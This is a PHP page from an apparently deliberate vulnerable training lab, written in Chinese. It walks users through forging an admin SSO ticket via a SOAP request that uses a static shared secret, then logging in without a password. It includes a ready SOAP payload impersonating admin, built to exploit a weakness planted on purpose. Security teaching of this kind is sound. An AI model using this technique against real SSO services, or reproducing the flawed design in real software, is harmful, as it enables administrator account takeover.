<?php
/**
 * Pikachu-Enhanced v2.0 - 企业级综合运营管理系统 (CorpHub)
 * Level 4: BPM/SSO SOAP 单点登录票据伪造致 Admin 免密接管 (CVSS 9.8 绝杀)
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/tscs_helper.inc.php';

// 处理 SOAP 签票请求
if (isset($_GET['action']) && $_GET['action'] === 'issue_ticket') {
    header('Content-Type: application/json; charset=utf-8');
    $rawInput = file_get_contents('php://input');
    $reqData = json_decode($rawInput, true) ?: $_POST;

    $systemCode = trim($reqData['systemCode'] ?? '');
    $secret = trim($reqData['secret'] ?? '');
    $userCode = trim($reqData['userCode'] ?? 'admin');

    $res = tscs_issue_sso_token($userCode, $systemCode, $secret);
    echo json_encode($res, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

// 处理 ssoLogin 免密登录消费票据
if (isset($_GET['action']) && $_GET['action'] === 'sso_login') {
    header('Content-Type: application/json; charset=utf-8');
    $rawInput = file_get_contents('php://input');
    $reqData = json_decode($rawInput, true) ?: $_POST;

    $token = trim($reqData['token'] ?? '');
    $loginRes = tscs_login_by_sso_token($token);
    echo json_encode($loginRes, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

$currentUser = tscs_get_current_user();

$ACTIVE = array_fill(0, 360, '');
$ACTIVE[350] = 'active open';
$ACTIVE[355] = 'active';

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.tscs-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 4px 14px rgba(0,0,0,0.03);
}
.soap-editor {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 12.5px;
    line-height: 1.55;
    border: 1px solid #334155;
    width: 100%;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="index.php">企业级综合业务系统 (CorpHub) 靶场</a></li>
                <li class="active">Level 4: SSO 票据伪造免密接管 Admin</li>
            </ul>
        </div>

        <div class="page-content">
            
            <div style="margin-bottom: 22px;">
                <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
                    <span class="badge" style="background:#dc2626; padding:4px 10px; font-size:12px;">Level 4 · 核心绝杀</span>
                    <span class="badge" style="background:#991b1b; padding:4px 10px; font-size:12px;">CVSS 9.8 紧急</span>
                    <span class="badge" style="background:#7f1d1d; padding:4px 10px; font-size:12px;">CWE-287 身份验证绕过</span>
                </div>
                <h2 style="font-weight: 800; font-size: 22px; margin: 0 0 8px 0; color: #991b1b;">
                    BPM/SSO SOAP 单点登录票据伪造致 Admin 免密接管
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    <strong>真实场景还原：</strong>在渗透测试后期，测试团队通过分析系统配置与 JS 脚本，发现了集团企业企业联邦 BPM 单点登录服务（<code>sso.corp-internal.com:8092/Portal/WebServices/SSOService?wsdl</code>）。该 SOAP 接口的身份校验<strong>完全依赖明文静态的 4 位共享密钥</strong> <code>systemCode=corp</code> 与 <code>secret=corp</code>（已在 Level 1 中从配置接口泄露）。攻击者无需知道任何密码，只需向 SOAP 接口提交 <code>userCode=admin</code>，服务端就会无条件签发超级管理员的合法 SSO 票据！随后调用 <code>/prod-api/ssoLogin</code>，直接免密接管超级管理员权限！
                </p>
            </div>

            <div class="alert alert-danger" style="border-radius:10px; font-size:13px; line-height:1.6; background:#fef2f2; border-color:#fecaca; color:#991b1b;">
                <strong>🎯 本关演练目标：</strong><br>
                1. <strong>构造 SOAP 签票报文</strong>：填入 <code>systemCode: corp</code>、<code>secret: corp</code>，并将伪造工号设为 <code>admin</code>。<br>
                2. <strong>请求 SSO 服务签发 Token</strong>：获取合法的 32 字节 SSO 认证票据。<br>
                3. <strong>调用 ssoLogin 免密登录</strong>：带着票据发送到主系统 <code>/prod-api/ssoLogin</code>，一键接管超级管理员 <code>admin</code>，解锁全部系统权限与定时任务管理！
            </div>

            <div class="row">
                
                <!-- 左侧: SOAP 请求构造与签票 -->
                <div class="col-md-6">
                    <div class="tscs-card">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:16px; color:#b91c1c; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-envelope" style="color:#dc2626;"></i> 步骤 1：向企业联邦 BPM 发起 SOAP 伪造签票请求
                        </h4>

                        <div class="form-group" style="margin-bottom:12px;">
                            <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                                <div>
                                    <label style="font-size:12px; font-weight:600; color:#334155;">系统代号 (systemCode):</label>
                                    <input type="text" id="soSystemCode" class="form-control" value="corp" style="border-radius:6px; font-family:monospace;">
                                </div>
                                <div>
                                    <label style="font-size:12px; font-weight:600; color:#334155;">共享密钥 (secret):</label>
                                    <input type="text" id="soSecret" class="form-control" value="corp" style="border-radius:6px; font-family:monospace;">
                                </div>
                                <div>
                                    <label style="font-size:12px; font-weight:600; color:#334155;">冒充工号 (userCode):</label>
                                    <input type="text" id="soUserCode" class="form-control" value="admin" style="border-radius:6px; font-family:monospace; font-weight:700; color:#dc2626;">
                                </div>
                            </div>
                        </div>

                        <div style="font-size:12px; font-weight:700; color:#64748b; margin-bottom:6px;">
                            待发送的 SOAP XML 报文体 (SSOSystemUrl):
                        </div>
                        <textarea id="soapXmlPreview" class="soap-editor" rows="7" readonly style="margin-bottom:14px;"><?php echo '<?xml version="1.0" encoding="utf-8"?>' . "\n"; ?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SSOSystemUrl xmlns="http://aozhe.com/">
      <systemCode>corp</systemCode>
      <secret>corp</secret>
      <userCode>admin</userCode>
      <targetSystemCode>corp</targetSystemCode>
    </SSOSystemUrl>
  </soap:Body>
</soap:Envelope></textarea>

                        <button class="btn btn-danger btn-block" onclick="sendSoapForgeTicket()" id="forgeTicketBtn" style="border-radius:8px; font-weight:700; padding:11px; background:#dc2626; border-color:#dc2626;">
                            <i class="ph-bold ph-key"></i> 发送 SOAP 请求并签发 admin 票据
                        </button>

                        <div id="ticketResultBox" style="display:none; margin-top:16px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:14px;">
                            <div style="font-size:13px; font-weight:700; color:#065f46; margin-bottom:6px;">
                                🎟️ 成功获取 BPM SSO 票据 (Token)：
                            </div>
                            <pre style="background:#0f172a; color:#38bdf8; padding:8px 12px; border-radius:6px; font-size:12.5px; word-break:break-all; margin:0;" id="tokenDisplay">-</pre>
                        </div>
                    </div>
                </div>

                <!-- 右侧: ssoLogin 免密消费票据与接管超管 -->
                <div class="col-md-6">
                    <div class="tscs-card">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:16px; color:#0f172a; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-door-open" style="color:#0284c7;"></i> 步骤 2：带着票据免密登录主站 (/prod-api/ssoLogin)
                        </h4>

                        <div class="form-group" style="margin-bottom:14px;">
                            <label style="font-size:13px; font-weight:600; color:#334155;">待消费的 SSO 票据 (Token)：</label>
                            <input type="text" id="consumeTokenInput" class="form-control" style="border-radius:8px; padding:10px 12px; height:auto; font-family:monospace;" placeholder="请先在左侧完成签票...">
                        </div>

                        <button class="btn btn-primary btn-block" onclick="consumeSsoTicket()" id="ssoLoginBtn" style="border-radius:8px; font-weight:700; padding:11px; background:#0284c7; border-color:#0284c7;">
                            <i class="ph-bold ph-shield-check"></i> 执行 POST /prod-api/ssoLogin 免密认证
                        </button>

                        <div id="loginSuccessBox" style="display:none; margin-top:18px; background:#ecfdf5; border:1px solid #a7f3d0; border-radius:10px; padding:18px;">
                            <div style="font-weight:800; color:#065f46; font-size:16px; margin-bottom:8px; display:flex; align-items:center; gap:8px;">
                                <i class="ph-bold ph-check-fat" style="font-size:22px; color:#059669;"></i> 🎉 成功免密接管超级管理员 (admin)！
                            </div>
                            <p style="font-size:13px; color:#047857; margin-bottom:12px; line-height:1.6;">
                                系统已为您建立超级管理员 Session！您现在拥有全站最高调度与审计特权，包括创建/修改系统用户、管理全局配置，以及访问 RuoYi 核心定时任务模块！
                            </p>
                            <div style="display:flex; gap:10px;">
                                <a href="quartz_job.php" class="btn btn-danger" style="flex:1; border-radius:6px; font-weight:700;">
                                    <i class="ph-bold ph-terminal-window"></i> 前往 Level 7 定时任务演练 ➔
                                </a>
                                <a href="index.php" class="btn btn-default" style="flex:1; border-radius:6px; font-weight:700;">
                                    返回靶场大盘
                                </a>
                            </div>
                        </div>

                        <?php if ($currentUser && $currentUser['role'] === 'admin'): ?>
                            <div style="margin-top:16px; background:#fef2f2; border:1px solid #fecaca; border-radius:8px; padding:12px; font-size:13px; color:#991b1b;">
                                <strong>当前身份：</strong> <?php echo htmlspecialchars($currentUser['nickName']); ?> (admin) · 拥有最高特权 <code>*:*:*</code>。
                            </div>
                        <?php endif; ?>

                    </div>

                    <!-- 真实复盘安全剖析 -->
                    <div class="tscs-card">
                        <h5 style="margin:0 0 10px 0; font-weight:700; color:#0f172a;">
                            <i class="ph-bold ph-shield-checkered" style="color:#16a34a;"></i> 渗透测试复盘：为什么这是 CVSS 9.8 绝杀？
                        </h5>
                        <ul style="font-size:12.5px; color:#475569; line-height:1.7; padding-left:18px; margin:0;">
                            <li><strong>密钥极度弱智：</strong>SSO 通信密钥仅为 4 位字符 <code>corp</code>，与系统代号完全一致，且直接写入公共配置表。</li>
                            <li><strong>缺乏防重放与来源校验：</strong>SOAP 签票接口未配置 IP 白名单，公网任意攻击者均可直连并要求签票。</li>
                            <li><strong>无双因子与管理员保护：</strong>系统未对超级管理员开启 2FA，也未禁止超管走 SSO 单点登录，导致一旦 SSO 出现破口，全站瞬间被直接连窝端！</li>
                        </ul>
                    </div>

                </div>

            </div>

        </div>
    </div>
</div>

<script>
let lastIssuedToken = '';

function sendSoapForgeTicket() {
    const sys = document.getElementById('soSystemCode').value.trim();
    const sec = document.getElementById('soSecret').value.trim();
    const user = document.getElementById('soUserCode').value.trim();
    const btn = document.getElementById('forgeTicketBtn');

    btn.disabled = true;
    btn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 正在向 BPM 发起 SOAP 伪造签票...';

    fetch('sso_ticket_forge.php?action=issue_ticket', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ systemCode: sys, secret: sec, userCode: user })
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            lastIssuedToken = data.token;
            document.getElementById('tokenDisplay').textContent = data.token;
            document.getElementById('ticketResultBox').style.display = 'block';
            document.getElementById('consumeTokenInput').value = data.token;
            alert('🎉 恭喜！BPM SSO 成功为用户 [' + user + '] 签发票据：\n' + data.token + '\n已自动填入右侧消费输入框！');
        } else {
            alert('签发失败: ' + data.error);
        }
    })
    .catch(err => {
        alert('请求异常: ' + err.message);
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerHTML = '<i class="ph-bold ph-key"></i> 发送 SOAP 请求并签发 admin 票据';
    });
}

function consumeSsoTicket() {
    const tok = document.getElementById('consumeTokenInput').value.trim();
    const btn = document.getElementById('ssoLoginBtn');
    if (!tok) {
        alert('请输入或先签发有效的 SSO Token！');
        return;
    }

    btn.disabled = true;
    btn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 正在执行免密认证...';

    fetch('sso_ticket_forge.php?action=sso_login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: tok })
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            document.getElementById('loginSuccessBox').style.display = 'block';
        } else {
            alert('认证失败: ' + data.error);
        }
    })
    .catch(err => {
        alert('请求异常: ' + err.message);
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerHTML = '<i class="ph-bold ph-shield-check"></i> 执行 POST /prod-api/ssoLogin 免密认证';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
